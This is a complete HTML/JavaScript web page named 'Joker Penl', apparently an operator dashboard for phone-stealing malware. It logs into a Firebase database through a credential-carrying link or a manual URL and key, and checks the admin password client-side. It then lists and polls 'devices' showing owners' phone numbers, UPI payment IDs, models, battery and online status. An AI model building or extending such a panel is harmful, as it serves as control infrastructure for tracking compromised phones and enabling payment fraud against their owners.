<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Joker Penl</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
:root{
  --bg:#0d0a0f;
  --surface:#1a1520;
  --surface2:#221d2a;
  --surface3:#2a2433;
  --border:rgba(255,255,255,.08);
  --border2:rgba(0,255,136,.2);
  --green:#00ff88;
  --green-dim:#00cc6a;
  --green-glow:rgba(0,255,136,.3);
  --green-soft:rgba(0,255,136,.1);
  --white:#e6edf3;
  --muted:#8a7d90;
  --red:#ff4466;
  --text-bright:#ffffff;
}
body{font-family:'Inter','Segoe UI',Arial,sans-serif;background:var(--bg);color:var(--white);min-height:100vh;
  overscroll-behavior-y:contain;-webkit-overflow-scrolling:touch;}
html{overscroll-behavior-y:none;background:var(--bg);}

/* ===== SETUP / LINK LOGIN SCREEN ===== */
#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,255,136,.08) 0%,transparent 50%),#0d0a0f;}
.sc{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:18px;
  padding:28px 20px;width:100%;max-width:420px;
  box-shadow:0 0 0 1px rgba(0,255,136,.1),0 20px 60px rgba(0,0,0,.4);}
.logo{text-align:center;margin-bottom:20px;}
.logo h1{font-size:21px;font-weight:800;color:var(--green);margin-top:6px;letter-spacing:.3px;}
.logo p{font-size:11px;color:var(--muted);margin-top:3px;text-transform:uppercase;letter-spacing:1.2px;}
.fg{margin-bottom:12px;}
.fg label{display:block;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;}
.fg input{width:100%;background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.1);
  border-radius:10px;padding:11px 13px;font-size:14px;outline:none;font-family:inherit;color:var(--white);}
.fg input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.15);}
.fg input::placeholder{color:var(--muted);}
.pbtn{width:100%;background:linear-gradient(135deg,var(--green),var(--green-dim));color:#0d0a0f;border:none;border-radius:10px;padding:14px;
  font-size:15px;font-weight:800;cursor:pointer;margin-top:4px;font-family:inherit;letter-spacing:.3px;
  box-shadow:0 4px 20px rgba(0,255,136,.4);}
.pbtn:disabled{opacity:.4;cursor:not-allowed;box-shadow:none;}
.errbox{background:var(--red-soft);border:1px solid rgba(255,68,102,.3);color:var(--red);
  padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;line-height:1.5;}

/* ===== LINK DETECTED BANNER ===== */
.link-banner{background:rgba(0,255,136,.1);border:1.5px solid rgba(0,255,136,.3);
  border-radius:12px;padding:12px 14px;margin-bottom:14px;
  display:flex;align-items:center;gap:10px;font-size:13px;color:var(--green);}
.link-banner .icon{font-size:20px;}
.link-banner .text{flex:1;}
.link-banner .text strong{color:#fff;}

/* ===== TOPBAR ===== */
.topbar{background:rgba(13,10,15,.95);border-bottom:1px solid var(--border);padding:12px 15px;
  display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;
  backdrop-filter:blur(12px);}
.tb-l{display:flex;align-items:center;gap:8px;color:var(--white);font-size:15px;font-weight:700;}
.tb-l .logo{font-size:20px;}
.tb-l .brand{background:linear-gradient(135deg,#00ff88,#00cc6a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
.live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);
  box-shadow:0 0 8px var(--green-glow);animation:blink 2s infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
.tb-r{display:flex;gap:7px;}
.xbtn{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
  border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;}
.xbtn:hover{background:rgba(255,255,255,.1);}

/* ===== STATS BAR ===== */
.stats-bar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;
  background:var(--surface);border-bottom:1px solid var(--border);flex-wrap:wrap;gap:4px;}
.stats-bar .count{font-size:12px;font-weight:700;color:var(--muted);}
.stats-bar .count span{color:#00ff88;font-size:14px;}

/* ===== SEARCH ===== */
.search-wrap{background:rgba(13,10,15,.92);padding:8px 14px;border-bottom:1px solid var(--border);
  position:sticky;top:52px;z-index:190;backdrop-filter:blur(12px);}
.sw{position:relative;}
.sw input{width:100%;background:var(--surface2);border:1.5px solid var(--border);
  border-radius:10px;padding:8px 14px 8px 36px;font-size:13px;outline:none;
  font-family:inherit;color:var(--white);}
.sw input:focus{border-color:var(--green);}
.sw input::placeholder{color:var(--muted);}
.s-ic{position:absolute;left:11px;top:50%;transform:translateY(-50%);font-size:14px;color:var(--muted);}
.s-cl{position:absolute;right:10px;top:50%;transform:translateY(-50%);
  background:none;border:none;font-size:14px;color:var(--muted);cursor:pointer;display:none;}

/* ===== DEVICE LIST ===== */
.device-list{padding:6px 14px 80px;}
.dev-card{background:var(--surface);border-radius:12px;margin-bottom:8px;
  border:1px solid var(--border);overflow:hidden;transition:transform .15s,border-color .3s;
  position:relative;cursor:pointer;}
.dev-card:active{transform:scale(.98);}
.dev-card.online{border-left:3px solid var(--green);}
.dev-card.offline{border-left:3px solid var(--muted);}
.dev-card .dev-num{position:absolute;top:10px;right:12px;
  font-size:11px;font-weight:700;color:var(--muted);background:rgba(0,0,0,.4);
  padding:1px 8px;border-radius:8px;}
.dev-card .dev-body{padding:10px 12px 8px;}
.dev-card .dev-row{display:flex;align-items:center;gap:8px;margin-bottom:4px;}
.dev-card .dev-icon{font-size:20px;}
.dev-card .dev-phone{font-size:14px;font-weight:700;color:var(--white);}
.dev-card .dev-phone.na{color:var(--muted);font-style:italic;}
.dev-card .dev-detail{font-size:11px;color:var(--muted);display:flex;flex-wrap:wrap;gap:4px 12px;}
.dev-card .dev-detail .value{color:var(--white);}
.dev-card .dev-detail .value.green{color:var(--green);}
.dev-card .dev-status{display:inline-block;padding:1px 8px;border-radius:10px;
  font-size:10px;font-weight:700;}
.dev-card .dev-status.online{background:var(--green-soft);color:var(--green);}
.dev-card .dev-status.offline{background:rgba(138,125,144,.15);color:var(--muted);}
.dev-card .dev-battery{display:flex;align-items:center;gap:4px;}
.dev-card .dev-battery .bar{width:30px;height:4px;background:var(--surface2);border-radius:3px;overflow:hidden;}
.dev-card .dev-battery .bar .fill{height:100%;border-radius:3px;background:var(--green);}
.dev-card .dev-battery .bar .fill.low{background:var(--red);}
.dev-card .dev-battery .bar .fill.med{background:#e3b341;}

/* ===== TOAST ===== */
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);
  background:var(--surface3);border:1px solid var(--border2);color:var(--text-bright);
  padding:8px 18px;border-radius:20px;font-size:12px;z-index:9999;
  opacity:0;pointer-events:none;transition:opacity .25s;white-space:nowrap;}

/* ===== EMPTY ===== */
.empty{text-align:center;padding:40px 14px;color:var(--muted);}
.empty .ei{font-size:36px;margin-bottom:8px;opacity:.4;}
.empty p{font-size:13px;line-height:1.6;}

/* ===== LOADING ===== */
.loading{display:flex;align-items:center;justify-content:center;
  padding:40px 14px;gap:10px;color:var(--muted);font-size:13px;}
.spin{width:20px;height:20px;border:2px solid var(--border);
  border-top-color:var(--green);border-radius:50%;animation:sp .8s linear infinite;}
@keyframes sp{to{transform:rotate(360deg);}}
</style>
</head>
<body>

<!-- ===== SETUP / LINK LOGIN SCREEN ===== -->
<div id="setup-screen" style="display:flex;min-height:100vh;align-items:center;justify-content:center;padding:20px;
  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,255,136,.08) 0%,transparent 50%),#0d0a0f;">
  <div class="sc">
    <div class="logo">
      <div style="font-size:50px">🃏</div>
      <h1>Joker Penl</h1>
      <p>Firebase Realtime Database Dashboard</p>
    </div>

    <!-- Link Detected Banner -->
    <div id="link-banner" class="link-banner" style="display:none;">
      <span class="icon">🔗</span>
      <span class="text"><strong>Link to continue the login</strong></span>
    </div>

    <!-- Quick Connect (Link-based) -->
    <div id="qc-section" style="display:none;">
      <div class="fg">
        <label>PASSWORD</label>
        <input id="qc-pass" type="password" placeholder="Admin password" autocomplete="off"
          onkeydown="if(event.key==='Enter')doQuickConnect()"/>
      </div>
      <button class="pbtn" id="qc-btn" onclick="doQuickConnect()">🔐 Connect</button>
      <div class="errbox" id="qc-err"></div>
    </div>

    <!-- Manual Setup -->
    <div id="full-setup-section" style="display:none;">
      <div class="fg"><label>Firebase Database URL</label>
        <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" autocomplete="off"/></div>
      <div class="fg"><label>API Key</label>
        <input id="cfg-key" type="password" placeholder="AIzaSy..." autocomplete="off"/></div>
      <div class="fg"><label>Main Node <span style="font-weight:400;text-transform:none;letter-spacing:0">(default: csc6)</span></label>
        <input id="cfg-node" value="csc6"/></div>
      <button class="pbtn" id="setup-btn" onclick="doSetup()">🃏 Connect &amp; Open</button>
      <div class="errbox" id="setup-err"></div>
    </div>
  </div>
</div>

<!-- ===== MAIN APP ===== -->
<div id="app" style="display:none;flex-direction:column;min-height:100vh;">

  <!-- TOP BAR -->
  <div class="topbar">
    <div class="tb-l"><span class="logo">🃏</span><span class="brand">Joker Penl</span><span class="live-dot"></span></div>
    <div class="tb-r"><button class="xbtn" onclick="doLogout()">🚪 Logout</button></div>
  </div>

  <!-- STATS -->
  <div class="stats-bar">
    <div class="count">📱 Device Count: <span id="dev-count">0</span></div>
  </div>

  <!-- SEARCH -->
  <div class="search-wrap">
    <div class="sw">
      <span class="s-ic">🔍</span>
      <input id="search-input" placeholder="Search Here" onkeyup="doSearch()"/>
      <button class="s-cl" id="s-cl" onclick="clearSearch()">✕</button>
    </div>
  </div>

  <!-- DEVICE LIST -->
  <div class="device-list" id="device-list">
    <div class="loading"><div class="spin"></div>&nbsp;Loading devices...</div>
  </div>
</div>

<div id="toast"></div>

<script>
/* ============================================================
   Joker Penl - Link-Based Auto-Login
   ============================================================ */

var DB = '', APIKEY = '', NODE = 'csc6';
var DEVS = {};
var infoInterval = null;
var TTIMER = null;
var LINK_PARAMS = null;

/* ===== DECODE LINK PARAMS ===== */
function decodeParams(b64){
  try{
    var s = b64.replace(/-/g,'+').replace(/_/g,'/');
    while(s.length % 4) s += '=';
    var payload = decodeURIComponent(escape(atob(s)));
    var obj = JSON.parse(payload);
    return { u: obj.u, k: obj.k || '', n: obj.n || 'csc6', p: obj.p || '', t: obj.t || '', a: obj.a || 0 };
  } catch(e){ return null; }
}

/* ===== CHECK URL HASH ===== */
function checkLinkHash(){
  var hash = window.location.hash.slice(1);
  if(!hash) return false;
  
  var decoded = decodeParams(hash);
  if(!decoded || !decoded.u) return false;
  
  LINK_PARAMS = decoded;
  
  // Show quick connect section with banner
  document.getElementById('qc-section').style.display = 'block';
  document.getElementById('full-setup-section').style.display = 'none';
  document.getElementById('link-banner').style.display = 'flex';
  
  // Set values (hidden, user only sees password field)
  DB = decoded.u.replace(/\/+$/,'');
  APIKEY = decoded.k || '';
  NODE = decoded.n || 'csc6';
  
  return true;
}

/* ===== QUICK CONNECT ===== */
function doQuickConnect(){
  var pass = document.getElementById('qc-pass').value.trim();
  var errEl = document.getElementById('qc-err');
  var btn = document.getElementById('qc-btn');
  
  errEl.style.display = 'none';
  btn.disabled = true;
  btn.textContent = 'Connecting...';
  
  if(!pass){
    btn.disabled = false;
    btn.textContent = '🔐 Connect';
    errEl.style.display = 'block';
    errEl.textContent = 'Password daalo!';
    return;
  }
  
  // Verify password with Firebase
  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
  var url = DB + '/' + NODE + '/Admin_Password.json' + auth;
  
  fetch(url)
    .then(function(r){ return r.json(); })
    .then(function(storedPass){
      if(!storedPass){
        btn.disabled = false;
        btn.textContent = '🔐 Connect';
        errEl.style.display = 'block';
        errEl.textContent = '⚠️ Password not set in Firebase!';
        return;
      }
      
      if(String(storedPass) === pass){
        // Password correct - launch app
        document.getElementById('setup-screen').style.display = 'none';
        document.getElementById('app').style.display = 'flex';
        loadDevices();
      } else {
        btn.disabled = false;
        btn.textContent = '🔐 Connect';
        errEl.style.display = 'block';
        errEl.textContent = '❌ Galat password!';
        document.getElementById('qc-pass').value = '';
        document.getElementById('qc-pass').focus();
      }
    })
    .catch(function(e){
      btn.disabled = false;
      btn.textContent = '🔐 Connect';
      errEl.style.display = 'block';
      errEl.textContent = '❌ Connection failed: ' + e.message;
    });
}

/* ===== MANUAL SETUP ===== */
function doSetup(){
  var url = document.getElementById('cfg-url').value.trim().replace(/\/+$/,'');
  var key = document.getElementById('cfg-key').value.trim();
  var node = document.getElementById('cfg-node').value.trim();
  
  document.getElementById('setup-err').style.display = 'none';
  
  if(!url){ showToast('Firebase URL daalo!'); return; }
  
  DB = url;
  APIKEY = key;
  NODE = node || 'csc6';
  
  var btn = document.getElementById('setup-btn');
  btn.disabled = true;
  btn.textContent = 'Connecting...';
  
  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
  fetch(DB + '/' + NODE + '/All_User/Info.json' + auth)
    .then(function(r){ return r.json(); })
    .then(function(data){
      btn.disabled = false;
      btn.textContent = '🃏 Connect & Open';
      
      if(data && typeof data === 'object'){
        document.getElementById('setup-screen').style.display = 'none';
        document.getElementById('app').style.display = 'flex';
        procInfo(data);
        startInfoPolling();
      } else {
        document.getElementById('setup-err').style.display = 'block';
        document.getElementById('setup-err').textContent = 'No devices found in ' + NODE;
      }
    })
    .catch(function(e){
      btn.disabled = false;
      btn.textContent = '🃏 Connect & Open';
      document.getElementById('setup-err').style.display = 'block';
      document.getElementById('setup-err').textContent = 'Error: ' + e.message;
    });
}

/* ===== LOAD DEVICES ===== */
function loadDevices(){
  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
  var url = DB + '/' + NODE + '/All_User/Info.json' + auth;
  
  fetch(url)
    .then(function(r){ return r.json(); })
    .then(function(data){
      if(data && typeof data === 'object'){
        procInfo(data);
        startInfoPolling();
      }
    })
    .catch(function(e){
      showToast('⚠️ Error loading devices: ' + e.message);
    });
}

/* ===== PROCESS INFO ===== */
function procInfo(data){
  if(!data || typeof data !== 'object') return;
  
  var keys = Object.keys(data);
  var newDevs = {};
  
  for(var i = 0; i < keys.length; i++){
    var k = keys[i];
    var info = data[k];
    if(!info || typeof info !== 'object') continue;
    
    var name = info.Name || info.name || k;
    var status = info.status || info.Status || 'Offline';
    var isOnline = status.toLowerCase() === 'online';
    
    newDevs[k] = {
      key: k,
      name: name,
      phone: info.Phone || info.Number || info.phone || 'N/A',
      upi: info.UPI || info.Upi || info.upi || 'N/A',
      model: info.Model || info.model || 'N/A',
      battery: info.Battery || info.battery || 0,
      date: info.Date || info.date || '',
      status: status,
      online: isOnline
    };
  }
  
  DEVS = newDevs;
  renderDevices();
}

/* ===== RENDER DEVICES ===== */
function renderDevices(){
  var q = document.getElementById('search-input').value.trim().toLowerCase();
  var list = document.getElementById('device-list');
  var devices = Object.values(DEVS);
  
  var filtered = devices;
  if(q){
    filtered = devices.filter(function(d){
      return (d.phone && d.phone.toLowerCase().indexOf(q) !== -1) ||
             (d.model && d.model.toLowerCase().indexOf(q) !== -1) ||
             (d.upi && d.upi.toLowerCase().indexOf(q) !== -1) ||
             (d.name && d.name.toLowerCase().indexOf(q) !== -1);
    });
  }
  
  if(!filtered.length){
    list.innerHTML = '<div class="empty"><div class="ei">📱</div><p>Koi device nahi mila</p></div>';
    document.getElementById('dev-count').textContent = '0';
    return;
  }
  
  var html = '';
  filtered.forEach(function(dev, index){
    var isOnline = dev.online;
    var bat = parseInt(dev.battery) || 0;
    var batClass = bat < 20 ? 'low' : (bat < 50 ? 'med' : '');
    var phoneDisplay = dev.phone && dev.phone !== 'N/A' ? dev.phone : 'N/A';
    var phoneClass = phoneDisplay === 'N/A' ? 'na' : '';
    
    html += '<div class="dev-card ' + (isOnline ? 'online' : 'offline') + '">';
    html += '<div class="dev-num">' + (index + 1) + '</div>';
    html += '<div class="dev-body">';
    html += '<div class="dev-row">';
    html += '<span class="dev-icon">📱</span>';
    html += '<span class="dev-phone ' + phoneClass + '">' + phoneDisplay + '</span>';
    html += '<span style="margin-left:auto;">';
    html += '<span class="dev-status ' + (isOnline ? 'online' : 'offline') + '">' + (isOnline ? '🟢 Online' : '🔴 Offline') + '</span>';
    html += '</span>';
    html += '</div>';
    html += '<div class="dev-detail">';
    html += '<span>📌 UPI: <span class="value">' + (dev.upi || 'N/A') + '</span></span>';
    html += '<span>📱 Model: <span class="value">' + (dev.model || 'N/A') + '</span></span>';
    html += '<span class="dev-battery">🔋 <span class="value green">' + bat + '%</span>';
    html += '<span class="bar"><span class="fill ' + batClass + '" style="width:' + bat + '%;"></span></span></span>';
    html += '<span>📅 <span class="value">' + (dev.date || 'N/A') + '</span></span>';
    html += '</div>';
    html += '</div>';
    html += '</div>';
  });
  
  list.innerHTML = html;
  document.getElementById('dev-count').textContent = filtered.length;
}

/* ===== SEARCH ===== */
function doSearch(){
  var q = document.getElementById('search-input').value.trim();
  document.getElementById('s-cl').style.display = q ? 'block' : 'none';
  renderDevices();
}

function clearSearch(){
  document.getElementById('search-input').value = '';
  document.getElementById('s-cl').style.display = 'none';
  renderDevices();
}

/* ===== INFO POLLING ===== */
function startInfoPolling(){
  if(infoInterval) clearInterval(infoInterval);
  
  infoInterval = setInterval(function(){
    var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
    fetch(DB + '/' + NODE + '/All_User/Info.json' + auth)
      .then(function(r){ return r.json(); })
      .then(function(data){
        if(data && typeof data === 'object'){
          procInfo(data);
        }
      })
      .catch(function(){});
  }, 30000);
}

/* ===== LOGOUT ===== */
function doLogout(){
  if(infoInterval) clearInterval(infoInterval);
  DEVS = {};
  document.getElementById('app').style.display = 'none';
  document.getElementById('setup-screen').style.display = 'flex';
  document.getElementById('qc-section').style.display = LINK_PARAMS ? 'block' : 'none';
  document.getElementById('full-setup-section').style.display = LINK_PARAMS ? 'none' : 'block';
  document.getElementById('link-banner').style.display = LINK_PARAMS ? 'flex' : 'none';
  document.getElementById('qc-pass').value = '';
  document.getElementById('qc-err').style.display = 'none';
  document.getElementById('qc-btn').disabled = false;
  document.getElementById('qc-btn').textContent = '🔐 Connect';
  showToast('👋 Logged out');
}

/* ===== TOAST ===== */
function showToast(msg){
  var t = document.getElementById('toast');
  t.innerHTML = msg;
  t.style.opacity = '1';
  clearTimeout(TTIMER);
  TTIMER = setTimeout(function(){ t.style.opacity = '0'; }, 2500);
}

/* ===== INIT ===== */
window.addEventListener('load', function(){
  // Check for link in URL hash
  var hasLink = checkLinkHash();
  
  if(hasLink){
    // Show link banner and password field
    document.getElementById('qc-section').style.display = 'block';
    document.getElementById('full-setup-section').style.display = 'none';
    document.getElementById('link-banner').style.display = 'flex';
    setTimeout(function(){
      document.getElementById('qc-pass').focus();
    }, 300);
  } else {
    // Show manual setup
    document.getElementById('qc-section').style.display = 'none';
    document.getElementById('full-setup-section').style.display = 'block';
    document.getElementById('link-banner').style.display = 'none';
  }
});

/* ===== KEYBOARD SHORTCUTS ===== */
document.addEventListener('keydown', function(e){
  if(e.key === 'Escape'){
    if(document.getElementById('qc-section').style.display === 'block'){
      document.getElementById('qc-pass').value = '';
    }
    clearSearch();
  }
});

/* ===== DISABLE PULL TO REFRESH ===== */
var _lastY = 0;
document.addEventListener('touchstart', function(e){
  _lastY = e.touches[0].clientY;
}, {passive: false});
document.addEventListener('touchmove', function(e){
  var y = e.touches[0].clientY;
  var scrollTop = document.scrollingElement ? document.scrollingElement.scrollTop : document.body.scrollTop;
  if(y > _lastY && scrollTop <= 0){
    e.preventDefault();
  }
}, {passive: false});
</script>
</body>
